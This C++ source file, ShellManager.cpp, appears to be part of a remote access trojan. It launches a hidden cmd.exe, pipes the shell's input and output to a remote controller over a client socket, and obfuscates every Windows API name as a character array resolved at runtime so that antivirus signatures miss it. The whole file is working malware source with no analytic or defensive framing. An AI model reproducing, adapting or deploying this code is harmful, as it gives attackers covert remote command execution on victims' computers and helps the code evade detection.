// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////

#include "../Declare.h"   //动态调用库函数
#include "ShellManager.h"


//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////

CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
{
    SECURITY_ATTRIBUTES  sa = {0};  
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 
	char  strShellPath[MAX_PATH] = {0};

    m_hReadPipeHandle	= NULL;
    m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
    m_hWritePipeShell	= NULL;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;

	CreatePipeT pCreatePipe=(CreatePipeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreatePipe");
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
    if(!pCreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if(m_hReadPipeHandle != NULL)	pCloseHandle(m_hReadPipeHandle);
		if(m_hWritePipeShell != NULL)	pCloseHandle(m_hWritePipeShell);
		return;
    }

    if(!pCreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
	{
		if(m_hWritePipeHandle != NULL)	pCloseHandle(m_hWritePipeHandle);
		if(m_hReadPipeShell != NULL)	pCloseHandle(m_hReadPipeShell);
		return;
    }

	memset((void *)&si, 0, sizeof(si));
    memset((void *)&pi, 0, sizeof(pi));

	char SSzlC12[] = {'G','e','t','S','t','a','r','t','u','p','I','n','f','o','A','\0'};
	GetStartupInfoAT pGetStartupInfoA=(GetStartupInfoAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC12);
	pGetStartupInfoA(&si);
	si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = m_hReadPipeShell;
    si.hStdOutput = si.hStdError = m_hWritePipeShell; 

	char Mstvw01[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
	GetSystemDirectoryAT pGetSystemDirectoryA=(GetSystemDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Mstvw01);
	pGetSystemDirectoryA(strShellPath, MAX_PATH);
	strcat(strShellPath,"\\cmd.exe");

	char BrmAP30[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0'};
	CreateProcessAT pCreateProcessA=(CreateProcessAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	if (!pCreateProcessA(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		pCloseHandle(m_hReadPipeHandle);
		pCloseHandle(m_hWritePipeHandle);
		pCloseHandle(m_hReadPipeShell);
		pCloseHandle(m_hWritePipeShell);
		return;
    }
	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle	= pi.hThread;

	BYTE	bToken = TOKEN_SHELL_START;
	Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();
	m_hThreadRead = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
}

CShellManager::~CShellManager()
{
	char FBwWp15[] = {'T','e','r','m','i','n','a','t','e','P','r','o','c','e','s','s','\0'};
	TerminateProcessT pTerminateProcess=(TerminateProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp15);
	char BrmAP30[] = {'T','e','r','m','i','n','a','t','e','T','h','r','e','a','d','\0'};
	TerminateThreadT pTerminateThread=(TerminateThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	pTerminateThread(m_hThreadRead, 0);
	pTerminateProcess(m_hProcessHandle, 0);
	pTerminateThread(m_hThreadHandle, 0);
    char BrmAP31[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
    WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP31);
	pWaitForSingleObject(m_hThreadMonitor, 2000);
//	pTerminateThread(m_hThreadMonitor, 0);

	char FBwWp17[] = {'D','i','s','c','o','n','n','e','c','t','N','a','m','e','d','P','i','p','e','\0'};
	DisconnectNamedPipeT pDisconnectNamedPipe=(DisconnectNamedPipeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp17);
	if (m_hReadPipeHandle != NULL)
		pDisconnectNamedPipe(m_hReadPipeHandle);
	if (m_hWritePipeHandle != NULL)
		pDisconnectNamedPipe(m_hWritePipeHandle);
	if (m_hReadPipeShell != NULL)
		pDisconnectNamedPipe(m_hReadPipeShell);
	if (m_hWritePipeShell != NULL)
		pDisconnectNamedPipe(m_hWritePipeShell);

	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
    pCloseHandle(m_hReadPipeHandle);
    pCloseHandle(m_hWritePipeHandle);
    pCloseHandle(m_hReadPipeShell);
    pCloseHandle(m_hWritePipeShell);

    pCloseHandle(m_hProcessHandle);
	pCloseHandle(m_hThreadHandle);
	pCloseHandle(m_hThreadMonitor);
    pCloseHandle(m_hThreadRead);
}

void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	
	unsigned long	ByteWrite;
	char HvnXs02[] = {'W','r','i','t','e','F','i','l','e','\0'};
	WriteFileT pWriteFile=(WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),HvnXs02);
	pWriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
}

DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CShellManager *pThis = (CShellManager *)lparam;
	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
	char sIQkS02[] = {'P','e','e','k','N','a','m','e','d','P','i','p','e','\0'};
	PeekNamedPipeT pPeekNamedPipe=(PeekNamedPipeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),sIQkS02);
	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	char Wffkl06[] = {'R','e','a','d','F','i','l','e','\0'};
    ReadFileT pReadFile=(ReadFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl06);
	while (1)
	{
		pSleep(100);
		while (pPeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			if (BytesRead <= 0)
				break;
			memset(ReadBuff, 0, sizeof(ReadBuff));
			LPBYTE lpBuffer = (LPBYTE)pLocalAlloc(LPTR, TotalBytesAvail);
			pReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			// 发送数据
			pThis->Send(lpBuffer, BytesRead);
			pLocalFree(lpBuffer);
		}
	}
	return 0;
}

DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
//	char FBwWp15[] = {'T','e','r','m','i','n','a','t','e','P','r','o','c','e','s','s','\0'};
//	TerminateProcessT pTerminateProcess=(TerminateProcessT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp15);
//	char BrmAP30[] = {'T','e','r','m','i','n','a','t','e','T','h','r','e','a','d','\0'};
//	TerminateThreadT pTerminateThread=(TerminateThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	CShellManager *pThis = (CShellManager *)lparam;
	HANDLE hThread[2];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	char FBwWp16[] = {'W','a','i','t','F','o','r','M','u','l','t','i','p','l','e','O','b','j','e','c','t','s','\0'};
	WaitForMultipleObjectsT pWaitForMultipleObjects=(WaitForMultipleObjectsT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp16);
	pWaitForMultipleObjects(2, hThread, FALSE, INFINITE);
//	pTerminateThread(pThis->m_hThreadRead, 0);
//	pTerminateProcess(pThis->m_hProcessHandle, 1);
	pThis->m_pClient->Disconnect();
	return 0;
}
